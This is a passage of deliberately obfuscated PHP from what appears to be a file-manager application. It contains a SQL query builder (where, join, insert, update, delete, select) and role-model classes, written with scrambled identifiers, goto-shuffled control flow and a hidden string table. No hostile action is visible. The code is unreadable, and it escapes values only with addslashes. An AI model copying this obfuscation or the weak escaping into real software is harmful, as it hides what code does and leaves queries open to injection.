foreach ($d‘¡Òß¦Æ‘ as $e¸ÄãŒÙáÀ => $fÙ„ô‚ĞÖ¬) { $E¹İ°¹æÏ = $a‘“ïİâßô ? $b¡ ªàÙìâ[$e¸ÄãŒÙáÀ] : $b¡ ªàÙìâ; $dÈ‡¦İšÓ[] = $c‘ßà†ƒ›™[245] . $this->parseWhereItem($this->parseKey($fÙ„ô‚ĞÖ¬), $E¹İ°¹æÏ) . $c‘ßà†ƒ›™[812]; } $A»¹©ˆ“Ã‰ .= implode($c‘ßà†ƒ›™[919], $dÈ‡¦İšÓ); } elseif (strpos($a˜òéÛåÜ½, $c‘ßà†ƒ›™[269])) { $d‘¡Òß¦Æ‘ = explode($c‘ßà†ƒ›™[269], $a˜òéÛåÜ½); $dÈ‡¦İšÓ = array(); foreach ($d‘¡Òß¦Æ‘ as $e¸ÄãŒÙáÀ => $fÙ„ô‚ĞÖ¬) { $E¹İ°¹æÏ = $a‘“ïİâßô ? $b¡ ªàÙìâ[$e¸ÄãŒÙáÀ] : $b¡ ªàÙìâ; $dÈ‡¦İšÓ[] = $c‘ßà†ƒ›™[245] . $this->parseWhereItem($this->parseKey($fÙ„ô‚ĞÖ¬), $E¹İ°¹æÏ) . $c‘ßà†ƒ›™[812]; } $A»¹©ˆ“Ã‰ .= implode($c‘ßà†ƒ›™[914], $dÈ‡¦İšÓ); } else { $A»¹©ˆ“Ã‰ .= $this->parseWhereItem($this->parseKey($a˜òéÛåÜ½), $b¡ ªàÙìâ); } } $A»¹©ˆ“Ã‰ .= $c‘ßà†ƒ›™[263] . $B ‚±–ÈÄ¬; } $A»¹©ˆ“Ã‰ = substr($A»¹©ˆ“Ã‰, 0, -strlen($B ‚±–ÈÄ¬)); } return empty($A»¹©ˆ“Ã‰) ? $c‘ßà†ƒ›™[33] : $c‘ßà†ƒ›™[920] . $A»¹©ˆ“Ã‰; } protected function parseWhereItem($d‡´§¥éŒ·, $B½ÚË¸) { $FÈÎ½è¢‘È =& $_SERVER[÷ÖêïÔÔÓ]; $CšĞ÷šÎšä = $FÈÎ½è¢‘È[33]; if (is_array($B½ÚË¸)) { if (is_string($B½ÚË¸[0])) { $e¬ĞˆÜ•ÆŞ = strtolower($B½ÚË¸[0]); if (in_array($B½ÚË¸[0], array($FÈÎ½è¢‘È[903], $FÈÎ½è¢‘È[921], $FÈÎ½è¢‘È[922], $FÈÎ½è¢‘È[923], $FÈÎ½è¢‘È[924], $FÈÎ½è¢‘È[925]))) { $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $B½ÚË¸[0] . $FÈÎ½è¢‘È[50] . $this->parseValue($B½ÚË¸[1]); } elseif (preg_match($FÈÎ½è¢‘È[926], $B½ÚË¸[0])) { $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[50] . $this->parseValue($B½ÚË¸[1]); } elseif (preg_match($FÈÎ½è¢‘È[927], $B½ÚË¸[0])) { if (is_array($B½ÚË¸[1])) { $EÒù³ÏøŠã = isset($B½ÚË¸[2]) ? strtoupper($B½ÚË¸[2]) : $FÈÎ½è¢‘È[912]; if (in_array($EÒù³ÏøŠã, array($FÈÎ½è¢‘È[911], $FÈÎ½è¢‘È[912], $FÈÎ½è¢‘È[913]))) { $a‡ê·é£‡ = array(); foreach ($B½ÚË¸[1] as $c•º·êƒ¡î) { $a‡ê·é£‡[] = $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[50] . $this->parseValue($c•º·êƒ¡î); } $CšĞ÷šÎšä .= $FÈÎ½è¢‘È[245] . implode($FÈÎ½è¢‘È[50] . $EÒù³ÏøŠã . $FÈÎ½è¢‘È[50], $a‡ê·é£‡) . $FÈÎ½è¢‘È[812]; } } else { $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[50] . $this->parseValue($B½ÚË¸[1]); } } elseif ($FÈÎ½è¢‘È[282] == $e¬ĞˆÜ•ÆŞ) { $CšĞ÷šÎšä .= $FÈÎ½è¢‘È[810] . $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $B½ÚË¸[1] . $FÈÎ½è¢‘È[928]; } elseif (preg_match($FÈÎ½è¢‘È[929], $B½ÚË¸[0])) { if (isset($B½ÚË¸[2]) && $FÈÎ½è¢‘È[282] == $B½ÚË¸[2]) { $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[50] . $B½ÚË¸[1]; } else { if (is_string($B½ÚË¸[1])) { $B½ÚË¸[1] = explode($FÈÎ½è¢‘È[47], $B½ÚË¸[1]); } $E¨¢œ§ê = implode($FÈÎ½è¢‘È[47], $this->parseValue($B½ÚË¸[1])); $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[810] . $E¨¢œ§ê . $FÈÎ½è¢‘È[812]; } } elseif (preg_match($FÈÎ½è¢‘È[930], $B½ÚË¸[0])) { $BœÃîÊ‰‹ = is_string($B½ÚË¸[1]) ? explode($FÈÎ½è¢‘È[47], $B½ÚË¸[1]) : $B½ÚË¸[1]; $CšĞ÷šÎšä .= $FÈÎ½è¢‘È[810] . $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $this->exp[$e¬ĞˆÜ•ÆŞ] . $FÈÎ½è¢‘È[50] . $this->parseValue($BœÃîÊ‰‹[0]) . $FÈÎ½è¢‘È[914] . $this->parseValue($BœÃîÊ‰‹[1]) . $FÈÎ½è¢‘È[263]; } else { think_exception(think_lang($FÈÎ½è¢‘È[917]) . $FÈÎ½è¢‘È[4] . $B½ÚË¸[0]); } } else { $a‘æéÇ¶áé = count($B½ÚË¸); $Bç›šÓ‘–‹ = isset($B½ÚË¸[$a‘æéÇ¶áé - 1]) ? strtoupper($B½ÚË¸[$a‘æéÇ¶áé - 1]) : $FÈÎ½è¢‘È[33]; if (in_array($Bç›šÓ‘–‹, array($FÈÎ½è¢‘È[911], $FÈÎ½è¢‘È[912], $FÈÎ½è¢‘È[913]))) { $a‘æéÇ¶áé = $a‘æéÇ¶áé - 1; } else { $Bç›šÓ‘–‹ = $FÈÎ½è¢‘È[911]; } for ($eÙæÑ‰’‰” = 0; $eÙæÑ‰’‰” < $a‘æéÇ¶áé; $eÙæÑ‰’‰”++) { $BœÃîÊ‰‹ = is_array($B½ÚË¸[$eÙæÑ‰’‰”]) ? $B½ÚË¸[$eÙæÑ‰’‰”][1] : $B½ÚË¸[$eÙæÑ‰’‰”]; if ($FÈÎ½è¢‘È[282] == strtolower($B½ÚË¸[$eÙæÑ‰’‰”][0])) { $CšĞ÷šÎšä .= $FÈÎ½è¢‘È[245] . $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $BœÃîÊ‰‹ . $FÈÎ½è¢‘È[928] . $Bç›šÓ‘–‹ . $FÈÎ½è¢‘È[50]; } else { $D‹ª‡õæÙâ = is_array($B½ÚË¸[$eÙæÑ‰’‰”]) ? $this->exp[strtolower($B½ÚË¸[$eÙæÑ‰’‰”][0])] : $FÈÎ½è¢‘È[903]; if (!$D‹ª‡õæÙâ && is_array($B½ÚË¸[$eÙæÑ‰’‰”]) && in_array($B½ÚË¸[$eÙæÑ‰’‰”][0], array($FÈÎ½è¢‘È[903], $FÈÎ½è¢‘È[921], $FÈÎ½è¢‘È[922], $FÈÎ½è¢‘È[923], $FÈÎ½è¢‘È[924], $FÈÎ½è¢‘È[925]))) { $D‹ª‡õæÙâ = $B½ÚË¸[$eÙæÑ‰’‰”][0]; } $CšĞ÷šÎšä .= $FÈÎ½è¢‘È[245] . $d‡´§¥éŒ· . $FÈÎ½è¢‘È[50] . $D‹ª‡õæÙâ . $FÈÎ½è¢‘È[50] . $this->parseValue($BœÃîÊ‰‹) . $FÈÎ½è¢‘È[928] . $Bç›šÓ‘–‹ . $FÈÎ½è¢‘È[50]; } } $CšĞ÷šÎšä = substr($CšĞ÷šÎšä, 0, -4); } } else { $CšĞ÷šÎšä .= $d‡´§¥éŒ· . $FÈÎ½è¢‘È[931] . $this->parseValue($B½ÚË¸); } return $CšĞ÷šÎšä; } protected function parseThinkWhere($fĞ¸Ô¤ÂÓ, $B¯Ÿò¶»Ô‡) { $e‚Å«Î¶ìŞ =& $_SERVER[÷ÖêïÔÔÓ]; $c‰à¾Èİµ = $e‚Å«Î¶ìŞ[33]; switch ($fĞ¸Ô¤ÂÓ) { case $e‚Å«Î¶ìŞ[335]: $c‰à¾Èİµ = $B¯Ÿò¶»Ô‡; break; case $e‚Å«Î¶ìŞ[915]: $c‰à¾Èİµ = is_string($B¯Ÿò¶»Ô‡) ? $B¯Ÿò¶»Ô‡ : substr($this->parseWhere($B¯Ÿò¶»Ô‡), 6); break; case $e‚Å«Î¶ìŞ[932]: parse_str($B¯Ÿò¶»Ô‡, $e”ßŸÍ¶ª„); if (isset($e”ßŸÍ¶ª„[$e‚Å«Î¶ìŞ[910]])) { $FÊ³®é§ğ = $e‚Å«Î¶ìŞ[50] . strtoupper($e”ßŸÍ¶ª„[$e‚Å«Î¶ìŞ[910]]) . $e‚Å«Î¶ìŞ[50]; unset($e”ßŸÍ¶ª„[$e‚Å«Î¶ìŞ[910]]); } else { $FÊ³®é§ğ = $e‚Å«Î¶ìŞ[914]; } $C›šŸŒƒè· = array(); foreach ($e”ßŸÍ¶ª„ as $EÁÕÁ‚æÍÊ => $e²ˆ‘‚Ÿ›Ÿ) { $C›šŸŒƒè·[] = $this->parseKey($EÁÕÁ‚æÍÊ) . $e‚Å«Î¶ìŞ[931] . $this->parseValue($e²ˆ‘‚Ÿ›Ÿ); } $c‰à¾Èİµ = implode($FÊ³®é§ğ, $C›šŸŒƒè·); break; } return $c‰à¾Èİµ; } protected function parseLimit($A›ó³ã·Á†) { $C™÷åêÍšî =& $_SERVER[÷ÖêïÔÔÓ]; return !empty($A›ó³ã·Á†) ? $C™÷åêÍšî[48] . $A›ó³ã·Á† . $C™÷åêÍšî[50] : $C™÷åêÍšî[33]; } protected function parseJoin($bğæ¬®¬£«) { $C¶‹íºèÃâ =& $_SERVER[÷ÖêïÔÔÓ]; $Dƒª‘Ë–ÙÖ = $C¶‹íºèÃâ[33]; if (!empty($bğæ¬®¬£«)) { if (is_array($bğæ¬®¬£«)) { foreach ($bğæ¬®¬£« as $D·„Ì–ª => $B‡Ì°ÈÌÍ) { if (!1 !== stripos($B‡Ì°ÈÌÍ, $C¶‹íºèÃâ[933])) { $Dƒª‘Ë–ÙÖ .= $C¶‹íºèÃâ[50] . $B‡Ì°ÈÌÍ; } else { $Dƒª‘Ë–ÙÖ .= $C¶‹íºèÃâ[934] . $B‡Ì°ÈÌÍ; } } } else { $Dƒª‘Ë–ÙÖ .= $C¶‹íºèÃâ[934] . $bğæ¬®¬£«; } } $Dƒª‘Ë–ÙÖ = preg_replace($C¶‹íºèÃâ[935], think_config($C¶‹íºèÃâ[838]) . $C¶‹íºèÃâ[936], $Dƒª‘Ë–ÙÖ); return $Dƒª‘Ë–ÙÖ; } protected function parseOrder($FË˜èÊÆ¶…) { $DœÏôî‰’ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($FË˜èÊÆ¶…)) { $fø”—…¿²¾ = array(); foreach ($FË˜èÊÆ¶… as $dÛ‚ÒÑœèç => $Dß«Ú†©”Ï) { if (is_numeric($dÛ‚ÒÑœèç)) { $fø”—…¿²¾[] = $this->parseKey($Dß«Ú†©”Ï); } else { $Dß«Ú†©”Ï = in_array(strtoupper(trim($Dß«Ú†©”Ï)), array($DœÏôî‰’[937], $DœÏôî‰’[938])) ? $DœÏôî‰’[50] . $Dß«Ú†©”Ï : $DœÏôî‰’[33]; if (preg_match($DœÏôî‰’[939], $dÛ‚ÒÑœèç)) { $fø”—…¿²¾[] = $this->parseKey($dÛ‚ÒÑœèç) . $Dß«Ú†©”Ï; } else { think_exception($DœÏôî‰’[940] . $dÛ‚ÒÑœèç); } } } $FË˜èÊÆ¶… = implode($DœÏôî‰’[47], $fø”—…¿²¾); } return !empty($FË˜èÊÆ¶…) ? $DœÏôî‰’[941] . $FË˜èÊÆ¶… : $DœÏôî‰’[33]; } protected function parseGroup($A‹øÙ‚Ü´ª) { $F­Û’÷ªŸ… =& $_SERVER[÷ÖêïÔÔÓ]; return !empty($A‹øÙ‚Ü´ª) ? $F­Û’÷ªŸ…[942] . $A‹øÙ‚Ü´ª : $F­Û’÷ªŸ…[33]; } protected function parseHaving($dÈÜÅÎĞÓ’) { $d­ã¨óœ›­ =& $_SERVER[÷ÖêïÔÔÓ]; return !empty($dÈÜÅÎĞÓ’) ? $d­ã¨óœ›­[943] . $dÈÜÅÎĞÓ’ : $d­ã¨óœ›­[33]; } protected function parseComment($E‘§–Ì«å) { $a¯öˆ°»Ş– =& $_SERVER[÷ÖêïÔÔÓ]; return !empty($E‘§–Ì«å) ? $a¯öˆ°»Ş–[944] . $E‘§–Ì«å . $a¯öˆ°»Ş–[945] : $a¯öˆ°»Ş–[33]; } protected function parseDistinct($EåÀîíÄ…Ò) { $Aôš­Ş¹àˆ =& $_SERVER[÷ÖêïÔÔÓ]; return !empty($EåÀîíÄ…Ò) ? $Aôš­Ş¹àˆ[946] : $Aôš­Ş¹àˆ[33]; } protected function parseUnion($EèÍˆ—ø™‰) { $báŠÍŞ§ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($EèÍˆ—ø™‰)) { return $báŠÍŞ§[33]; } if (isset($EèÍˆ—ø™‰[$báŠÍŞ§[333]])) { $d—¸¿°¼ö = $báŠÍŞ§[947]; unset($EèÍˆ—ø™‰[$báŠÍŞ§[333]]); } else { $d—¸¿°¼ö = $báŠÍŞ§[948]; } foreach ($EèÍˆ—ø™‰ as $FÁ³‰õôÜ•) { $f„šó°î©ƒ[] = $d—¸¿°¼ö . (is_array($FÁ³‰õôÜ•) ? $this->buildSelectSql($FÁ³‰õôÜ•) : $FÁ³‰õôÜ•); } return implode($báŠÍŞ§[50], $f„šó°î©ƒ); } public function insert($eËó¨°„†å, $C³æÙ–Š× = array(), $b°Òêí’ÑÌ = false) { goto Aè†±œ”»; dØ¶¦èµ¦: foreach ($eËó¨°„†å as $dß•š„‰Ø => $EÁ‚ñŒÑó) { if (is_array($EÁ‚ñŒÑó) && $F…¶¾õî‡ç[282] == $EÁ‚ñŒÑó[0]) { $A„šƒÕ»‰‡[] = $this->parseKey($dß•š„‰Ø); $Cåé¬–¼«ª[] = $EÁ‚ñŒÑó[1]; } elseif (is_scalar($EÁ‚ñŒÑó) || is_null($EÁ‚ñŒÑó)) { $A„šƒÕ»‰‡[] = $this->parseKey($dß•š„‰Ø); $Cåé¬–¼«ª[] = $this->parseValue($EÁ‚ñŒÑó); } } $D¬ŒÜÙê“‡ = ($b°Òêí’ÑÌ ? $F…¶¾õî‡ç[814] : $F…¶¾õî‡ç[815]) . $F…¶¾õî‡ç[816] . $this->parseTable($C³æÙ–Š×[$F…¶¾õî‡ç[264]]) . $F…¶¾õî‡ç[810] . implode($F…¶¾õî‡ç[47], $A„šƒÕ»‰‡) . $F…¶¾õî‡ç[811] . implode($F…¶¾õî‡ç[47], $Cåé¬–¼«ª) . $F…¶¾õî‡ç[812]; $D¬ŒÜÙê“‡ .= $this->parseLock(isset($C³æÙ–Š×[$F…¶¾õî‡ç[765]]) ? $C³æÙ–Š×[$F…¶¾õî‡ç[765]] : !1); goto a‰âˆ­ëµÌ; Aè†±œ”»: $F…¶¾õî‡ç =& $_SERVER[÷ÖêïÔÔÓ]; $Cåé¬–¼«ª = $A„šƒÕ»‰‡ = array(); $this->model = $C³æÙ–Š×[$F…¶¾õî‡ç[266]]; goto dØ¶¦èµ¦; a‰âˆ­ëµÌ: $D¬ŒÜÙê“‡ .= $this->parseComment(!empty($C³æÙ–Š×[$F…¶¾õî‡ç[337]]) ? $C³æÙ–Š×[$F…¶¾õî‡ç[337]] : $F…¶¾õî‡ç[33]); return $this->execute($D¬ŒÜÙê“‡, $this->parseBind(!empty($C³æÙ–Š×[$F…¶¾õî‡ç[270]]) ? $C³æÙ–Š×[$F…¶¾õî‡ç[270]] : array())); goto b–Ÿ’è¦ÌÃ; b–Ÿ’è¦ÌÃ: } public function selectInsert($DŠÜí»„îÑ, $Aµê¾«šã, $FÎ‘öŞá = array()) { goto fÇ´»¢å¾½; AÓµµñÓµ: return $this->execute($aÕ‚Ú¦É‹£, $this->parseBind(!empty($FÎ‘öŞá[$FÑÕ·†ãù[270]]) ? $FÎ‘öŞá[$FÑÕ·†ãù[270]] : array())); goto EµÆë±Å‹Ì; fÇ´»¢å¾½: $FÑÕ·†ãù =& $_SERVER[÷ÖêïÔÔÓ]; $this->model = $FÎ‘öŞá[$FÑÕ·†ãù[266]]; if (is_string($DŠÜí»„îÑ)) { $DŠÜí»„îÑ = explode($FÑÕ·†ãù[47], $DŠÜí»„îÑ); } goto aíƒ×Ç•ˆ; aíƒ×Ç•ˆ: array_walk($DŠÜí»„îÑ, array($this, $FÑÕ·†ãù[813])); $aÕ‚Ú¦É‹£ = $FÑÕ·†ãù[949] . $this->parseTable($Aµê¾«šã) . $FÑÕ·†ãù[810] . implode($FÑÕ·†ãù[47], $DŠÜí»„îÑ) . $FÑÕ·†ãù[928]; $aÕ‚Ú¦É‹£ .= $this->buildSelectSql($FÎ‘öŞá); goto AÓµµñÓµ; EµÆë±Å‹Ì: } public function update($c…Ì‡…ï¾¥, $Eùà¢Áğ¿¶) { $Fˆ±ëÂïš =& $_SERVER[÷ÖêïÔÔÓ]; $this->model = $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[266]]; $d³»á ±¨¨ = $Fˆ±ëÂïš[950] . $this->parseTable($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[264]]) . $this->parseSet($c…Ì‡…ï¾¥) . $this->parseWhere(!empty($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[260]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[260]] : $Fˆ±ëÂïš[33]) . $this->parseOrder(!empty($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[346]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[346]] : $Fˆ±ëÂïš[33]) . $this->parseLimit(!empty($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[277]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[277]] : $Fˆ±ëÂïš[33]) . $this->parseLock(isset($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[765]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[765]] : !1) . $this->parseComment(!empty($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[337]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[337]] : $Fˆ±ëÂïš[33]); return $this->execute($d³»á ±¨¨, $this->parseBind(!empty($Eùà¢Áğ¿¶[$Fˆ±ëÂïš[270]]) ? $Eùà¢Áğ¿¶[$Fˆ±ëÂïš[270]] : array())); } public function delete($Cí¿–™§¸Ğ = array()) { $aëéÍóÔ¬ =& $_SERVER[÷ÖêïÔÔÓ]; $this->model = $Cí¿–™§¸Ğ[$aëéÍóÔ¬[266]]; $Dİ¦´È­ÕÀ = $aëéÍóÔ¬[951] . $this->parseTable($Cí¿–™§¸Ğ[$aëéÍóÔ¬[264]]) . $this->parseWhere(!empty($Cí¿–™§¸Ğ[$aëéÍóÔ¬[260]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[260]] : $aëéÍóÔ¬[33]) . $this->parseOrder(!empty($Cí¿–™§¸Ğ[$aëéÍóÔ¬[346]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[346]] : $aëéÍóÔ¬[33]) . $this->parseLimit(!empty($Cí¿–™§¸Ğ[$aëéÍóÔ¬[277]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[277]] : $aëéÍóÔ¬[33]) . $this->parseLock(isset($Cí¿–™§¸Ğ[$aëéÍóÔ¬[765]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[765]] : !1) . $this->parseComment(!empty($Cí¿–™§¸Ğ[$aëéÍóÔ¬[337]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[337]] : $aëéÍóÔ¬[33]); return $this->execute($Dİ¦´È­ÕÀ, $this->parseBind(!empty($Cí¿–™§¸Ğ[$aëéÍóÔ¬[270]]) ? $Cí¿–™§¸Ğ[$aëéÍóÔ¬[270]] : array())); } public function select($AÜ¨Úí¯ = array()) { goto bò­èÜƒª±; f×ËÎ: $Bî¨Õì‡Œ = isset($AÜ¨Úí¯[$cµ¶Àî‹»[334]]) ? $AÜ¨Úí¯[$cµ¶Àî‹»[334]] : !1; if ($Bî¨Õì‡Œ) { $cïËŒÎ = is_string($Bî¨Õì‡Œ[$cµ¶Àî‹»[88]]) ? $Bî¨Õì‡Œ[$cµ¶Àî‹»[88]] : $cµ¶Àî‹»[952] . md5($còŞµ‡Ò„); $bŸ«¬ˆŒ½‘ = think_cache($cïËŒÎ, $cµ¶Àî‹»[33], $Bî¨Õì‡Œ); if (!1 !== $bŸ«¬ˆŒ½‘) { return $bŸ«¬ˆŒ½‘; } } $cèêØƒ‡Óë = $this->query($còŞµ‡Ò„, $this->parseBind(!empty($AÜ¨Úí¯[$cµ¶Àî‹»[270]]) ? $AÜ¨Úí¯[$cµ¶Àî‹»[270]] : array())); goto C…Âç…¹×§; bò­èÜƒª±: $cµ¶Àî‹» =& $_SERVER[÷ÖêïÔÔÓ]; $this->model = $AÜ¨Úí¯[$cµ¶Àî‹»[266]]; $còŞµ‡Ò„ = $this->buildSelectSql($AÜ¨Úí¯); goto f×ËÎ; C…Âç…¹×§: if ($Bî¨Õì‡Œ && !1 !== $cèêØƒ‡Óë) { think_cache($cïËŒÎ, $cèêØƒ‡Óë, $Bî¨Õì‡Œ); } return $cèêØƒ‡Óë; goto eÊ§À×„×; eÊ§À×„×: } public function buildSelectSql($Dº·¥çÄµî = array()) { goto EÄÄóÚ¶·”; aÓ‚”ÆØÑ: $Bğ¸ğ¿‹Ô = $this->parseSql($this->selectSql, $Dº·¥çÄµî); $Bğ¸ğ¿‹Ô .= $this->parseLock(isset($Dº·¥çÄµî[$BÀô‚ªÍá[765]]) ? $Dº·¥çÄµî[$BÀô‚ªÍá[765]] : !1); if (isset($cÚ¸ŠÒçËˆ)) { think_cache($cÚ¸ŠÒçËˆ, $Bğ¸ğ¿‹Ô); } goto A©ø…‡÷Ö§; A©ø…‡÷Ö§: return $Bğ¸ğ¿‹Ô; goto FÍÜ…Ò¹à; EÄÄóÚ¶·”: $BÀô‚ªÍá =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($Dº·¥çÄµî[$BÀô‚ªÍá[336]])) { if (strpos($Dº·¥çÄµî[$BÀô‚ªÍá[336]], $BÀô‚ªÍá[47])) { list($f‰–ÅÈ©•‡, $e´Ğ‘ù˜¾) = explode($BÀô‚ªÍá[47], $Dº·¥çÄµî[$BÀô‚ªÍá[336]]); } else { $f‰–ÅÈ©•‡ = $Dº·¥çÄµî[$BÀô‚ªÍá[336]]; } $f‰–ÅÈ©•‡ = $f‰–ÅÈ©•‡ ? $f‰–ÅÈ©•‡ : 1; $e´Ğ‘ù˜¾ = isset($e´Ğ‘ù˜¾) ? $e´Ğ‘ù˜¾ : (is_numeric($Dº·¥çÄµî[$BÀô‚ªÍá[277]]) ? $Dº·¥çÄµî[$BÀô‚ªÍá[277]] : 20); $FøÛë“®è… = $e´Ğ‘ù˜¾ * ((int) $f‰–ÅÈ©•‡ - 1); $Dº·¥çÄµî[$BÀô‚ªÍá[277]] = $FøÛë“®è… . $BÀô‚ªÍá[47] . $e´Ğ‘ù˜¾; } if (think_config($BÀô‚ªÍá[953])) { $cÚ¸ŠÒçËˆ = $BÀô‚ªÍá[954] . md5(serialize($Dº·¥çÄµî)); $aìºé’µÊ = think_cache($cÚ¸ŠÒçËˆ); if ($aìºé’µÊ) { return $aìºé’µÊ; } } goto aÓ‚”ÆØÑ; FÍÜ…Ò¹à: } public function parseSql($e›¤µëÍŠ, $B‚­ƒ¦¹½‡ = array()) { $dËÆ³§î•¼ =& $_SERVER[÷ÖêïÔÔÓ]; $e›¤µëÍŠ = str_replace(array($dËÆ³§î•¼[955], $dËÆ³§î•¼[956], $dËÆ³§î•¼[957], $dËÆ³§î•¼[958], $dËÆ³§î•¼[959], $dËÆ³§î•¼[960], $dËÆ³§î•¼[961], $dËÆ³§î•¼[962], $dËÆ³§î•¼[963], $dËÆ³§î•¼[964], $dËÆ³§î•¼[965]), array($this->parseTable("{$B‚­ƒ¦¹½‡[$dËÆ³§î•¼[264]]}"), $this->parseDistinct(isset($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[966]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[966]] : !1), $this->parseField(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[258]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[258]] : $dËÆ³§î•¼[173]), $this->parseJoin(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[267]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[267]] : $dËÆ³§î•¼[33]), $this->parseWhere(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[260]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[260]] : $dËÆ³§î•¼[33]), $this->parseGroup(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[967]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[967]] : $dËÆ³§î•¼[33]), $this->parseHaving(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[968]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[968]] : $dËÆ³§î•¼[33]), $this->parseOrder(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[346]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[346]] : $dËÆ³§î•¼[33]), $this->parseLimit(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[277]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[277]] : $dËÆ³§î•¼[33]), $this->parseUnion(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[332]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[332]] : $dËÆ³§î•¼[33]), $this->parseComment(!empty($B‚­ƒ¦¹½‡[$dËÆ³§î•¼[337]]) ? $B‚­ƒ¦¹½‡[$dËÆ³§î•¼[337]] : $dËÆ³§î•¼[33])), $e›¤µëÍŠ); return $e›¤µëÍŠ; } public function getLastSql($aÚ¸¬¸Äœ¹ = '') { return $aÚ¸¬¸Äœ¹ ? $this->modelSql[$aÚ¸¬¸Äœ¹] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($d–äÓ¢áí¸) { return addslashes($d–äÓ¢áí¸); } public function setModel($e†Ûâ¯­‚í) { $this->model = $e†Ûâ¯­‚í; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto bˆ³¡˜¶â–; d¬ÕõÏ£: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x72\157\154\x65\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\164\x68", "\154\141\142\145\x6c", "\x64\x69\x73\x70\x6c\x61\171", "\163\171\x73\x74\x65\155", "\x64\145\163\x63", "\151\x67\156\x6f\x72\145\x45\x78\164", "\151\147\156\157\162\x65\x46\151\154\x65\x53\x69\x7a\145", "\x61\x64\155\x69\x6e\151\163\164\x72\141\x74\157\x72", "\x73\x6f\162\x74"); public function listData($Eæ×ÊÈ©Ö = false, $CØŞÂÚµÂù = "\x73\157\162\164", $E¿Æõ¼ôÀ = false) { return parent::listData($Eæ×ÊÈ©Ö, $CØŞÂÚµÂù, $E¿Æõ¼ôÀ); } public function update($a±¶éğßÎ†, $d¡ô“¢õñË) { goto bëÚ­ÍÃ¶; eÒ©¸Îµ¬: if (!$E·ª–“¯óŒ || $DÊšÌ—š¸ƒ && $DÊšÌ—š¸ƒ[$B²ÛŞÓ‘º[364]] != $E·ª–“¯óŒ[$B²ÛŞÓ‘º[364]]) { return !1; } if ($DÊšÌ—š¸ƒ[$B²ÛŞÓ‘º[2352]] == 1) { $d¡ô“¢õñË = array($B²ÛŞÓ‘º[28] => $d¡ô“¢õñË[$B²ÛŞÓ‘º[28]], $B²ÛŞÓ‘º[2022] => $d¡ô“¢õñË[$B²ÛŞÓ‘º[2022]]); } $this->filterAuth($d¡ô“¢õñË[$B²ÛŞÓ‘º[373]]); goto cç¯‰ŒÄ…; cç¯‰ŒÄ…: return parent::update($a±¶éğßÎ†, $d¡ô“¢õñË); goto fÄ˜î‹´“; bëÚ­ÍÃ¶: $B²ÛŞÓ‘º =& $_SERVER[÷ÖêïÔÔÓ]; $E·ª–“¯óŒ = parent::listData($a±¶éğßÎ†); $DÊšÌ—š¸ƒ = $this->findByName($d¡ô“¢õñË[$B²ÛŞÓ‘º[28]]); goto eÒ©¸Îµ¬; fÄ˜î‹´“: } public function remove($a¢¸ò¿ñØ½) { $aùÛ‘ò¯Ñ¹ = parent::listData($a¢¸ò¿ñØ½); if 